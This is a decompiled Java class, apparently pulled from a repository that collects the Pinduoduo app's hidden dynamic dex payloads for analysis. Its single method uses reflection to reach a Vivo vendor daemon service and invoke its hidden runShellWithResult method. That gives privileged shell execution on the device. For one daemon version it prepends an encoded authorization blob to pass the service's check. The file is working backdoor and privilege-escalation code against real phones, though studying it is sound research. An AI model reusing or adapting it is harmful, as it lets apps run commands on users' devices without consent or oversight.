package com.google.android.sd.biz_dynamic_dex.vivo_base;

import android.os.Build;
import android.os.IBinder;
import android.text.TextUtils;
import java.lang.reflect.Method;

public class DaemonRunShellUtil {
  public static String callShell(String paramString) {
    try {
      Method method1 = Class.forName("android.os.ServiceManager").getDeclaredMethod("getService", new Class[] { String.class });
      method1.setAccessible(true);
      Class<?> clazz = Class.forName("com.vivo.services.daemon.VivoDmServiceProxy");
      Object object = clazz.getDeclaredMethod("asInterface", new Class[] { IBinder.class }).invoke(null, new Object[] { method1.invoke(null, new Object[] { "vivo_daemon.service" }) });
      Method method2 = clazz.getDeclaredMethod("runShellWithResult", new Class[] { String.class });
      method2.setAccessible(true);
      clazz.getDeclaredMethod("runShell", new Class[] { String.class }).setAccessible(true);
      if (TextUtils.equals(getDaemonVersion(), "3.1.0")) {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append("GA8CLwlZ38dIAjZNQQ3IKP0bTy+JgYaJQxHB6oCXASLqbIAGS85UPD9PdEe7C52PCvdwzCswCtjlmPaoP+j4ZmMBXOtpylzI7yYS6hrcNra6zKh8C3Y68RGgBt45+OEOcDTRG73Bew2akGCXbwBp8mdbEioZEMrZsPdx+JNQavca19E43h8+FSNm2RdJAG/pGjtP+w3kHvPMM6hZEZItwLWsqwfFNjByVc9t9LfO818eR/qKh1hRJN8D2M2uuqmYrD35QPvw3uZWYqYt9strqbTvIarWBA/1wpPvdI9ddMcnXQxFbn/ApYxHfh9i+M6fWfe8pp4PKuV1WCuYb73hsw==?");
        stringBuilder.append(paramString);
        return (String)method2.invoke(object, new Object[] { stringBuilder.toString() });
      } 
      return (String)method2.invoke(object, new Object[] { paramString });
    } catch (Exception exception) {
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append("fail: ");
      stringBuilder.append(exception);
      return stringBuilder.toString();
    } 
  }
  
  private static String getDaemonVersion() {
    return (Build.VERSION.SDK_INT >= 26) ? reflectGetProperties("persist.vivo.vivo_daemon", "null") : System.getProperty("persist.vivo.vivo_daemon", "null");
  }
  
  private static String reflectGetProperties(String paramString1, String paramString2) {
    try {
      return Class.forName("android.os.SystemProperties").getMethod("get", new Class[] { String.class, String.class }).invoke(null, new Object[] { paramString1, paramString2 }).toString();
    } catch (Exception exception) {
      return paramString2;
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\be7a2b643d7e8543f49994ffeb0ee0b6-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\vivo_base\DaemonRunShellUtil.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */